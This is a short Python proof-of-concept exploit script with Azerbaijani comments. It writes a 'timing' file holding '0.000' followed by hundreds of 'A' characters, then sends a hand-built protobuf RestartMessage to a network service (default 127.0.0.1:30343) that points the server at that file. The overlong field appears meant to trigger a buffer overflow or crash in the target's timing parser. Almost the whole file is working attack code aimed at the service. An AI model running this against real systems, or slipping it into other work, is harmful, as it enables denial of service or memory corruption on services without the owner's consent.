#!/usr/bin/env python3
import os, socket, struct, time, argparse

def write_header_and_As(path: str, header: str, a_count: int):
    """timing faylına tək sətrdə 'header + A-lar' yazır"""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    line = header.rstrip("\n") + " " + ("A" * int(a_count)) + "\n"
    with open(path, "w") as f:
        f.write(line)
    print(f"[+] Timing file written to {path} (length: {len(line)} bytes)")

def v(n: int) -> bytes:
    """protobuf varint encoder"""
    b = bytearray()
    while True:
        t = n & 0x7F
        n >>= 7
        b.append(t | 0x80 if n else t)
        if not n:
            break
    return bytes(b)

def restart(log_id: bytes) -> bytes:
    """RestartMessage"""
    t = bytearray(b"\x08") + v(int(time.time())) + b"\x10" + v(0)
    m = bytearray(b"\x0A") + v(len(log_id)) + log_id + b"\x12" + v(len(t)) + t
    return bytes(m)

def send_restart(host: str, port: int, log_id: bytes):
    """Serverə RestartMessage göndərir"""
    s = socket.create_connection((host, port), 5)
    payload = restart(log_id)
    msg = bytes([0x22]) + v(len(payload)) + payload
    pkt = struct.pack("!I", len(msg)) + msg
    s.sendall(pkt)
    s.close()
    print(f"[+] Sent RestartMessage with LOG_ID={log_id.decode(errors='ignore')} to {host}:{port}")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Minimal PoC — timing: '0.000 AAAAA...' single-line, then send RestartMessage")
    p.add_argument("--host", default="127.0.0.1", help="Target host")
    p.add_argument("--port", type=int, default=30343, help="Target port")
    p.add_argument("--path", default="/tmp/poc_dir", help="Path used as LOG_ID and timing file location")
    p.add_argument("--size", type=int, default=500, help="Number of 'A' characters after header (default: 500)")
    args = p.parse_args()

    timing_path = os.path.join(args.path, "timing")
    write_header_and_As(timing_path, "0.000", args.size)
    send_restart(args.host, args.port, args.path.encode())
